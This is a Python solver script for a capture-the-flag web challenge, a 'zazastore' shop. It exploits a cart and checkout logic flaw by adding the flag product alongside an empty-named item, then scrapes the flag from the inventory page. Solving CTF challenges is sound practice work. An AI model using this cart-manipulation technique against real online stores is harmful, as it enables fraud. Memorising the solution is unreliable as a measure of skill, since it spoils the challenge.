import requests, re

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(url: str, prefix: str) -> str:
    with requests.Session() as ses:
        headers = {
            "Content-Type": "application/json"
        }
        login_data = {
            "username": "anything1",
            "password": "nothing"
        }
        ses.post(f"{url}/login", headers = headers, json = login_data)
        flag_data = {
            "product": "RealZa",
            "quantity": 1
        }
        fake_data = {
            "product": "",
            "quantity": 1
        }
        ses.post(f"{url}/add-cart", headers = headers, json = flag_data)
        ses.post(f"{url}/add-cart", headers = headers, json = fake_data)
        ses.post(f"{url}/checkout")
        return get_flag(ses.get(f"{url}/inventory").text, prefix)

if __name__ == "__main__":
    url = f"https://zazastore.ctf.pascalctf.it"
    prefix = "pascalCTF"
    print(solution(url, prefix))
    